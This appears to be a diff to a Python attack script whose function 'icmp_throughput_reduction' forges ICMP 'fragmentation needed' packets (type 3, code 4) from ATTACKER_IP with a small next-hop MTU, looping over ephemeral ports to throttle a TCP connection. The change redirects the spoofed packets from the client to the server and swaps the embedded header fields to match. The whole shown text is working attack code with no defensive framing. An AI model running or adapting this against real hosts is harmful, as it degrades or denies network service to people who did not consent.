@@ -197,13 +197,13 @@ def icmp_throughput_reduction(sock, strategy="random"):
         for port in ports:
             seq = 12345
                 
-            embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
+            embedded = build_embedded_headers(SERVER_IP, CLIENT_IP, SERVER_PORT, port, seq)
             mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
             icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
-            ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
+            ip_header = build_ip_header(ATTACKER_IP, SERVER_IP, len(icmp_header) + len(embedded))
                 
             packet = ip_header + icmp_header + embedded
-            sock.sendto(packet, (CLIENT_IP, 0))
+            sock.sendto(packet, (SERVER_IP, 0))
             attack_count += 1
                 
             if attack_count % 200 == 0:
@@ -235,13 +235,13 @@ def icmp_throughput_reduction(sock, strategy="random"):
         for port in range(32768, 65536):
             seq = 12345
                 
-            embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
+            embedded = build_embedded_headers(SERVER_IP, CLIENT_IP, SERVER_PORT, port, seq)
             mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
             icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
-            ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
+            ip_header = build_ip_header(ATTACKER_IP, SERVER_IP, len(icmp_header) + len(embedded))
                 
             packet = ip_header + icmp_header + embedded
-            sock.sendto(packet, (CLIENT_IP, 0))
+            sock.sendto(packet, (SERVER_IP, 0))
             attack_count += 1
                 
             if port % 1000 == 768:
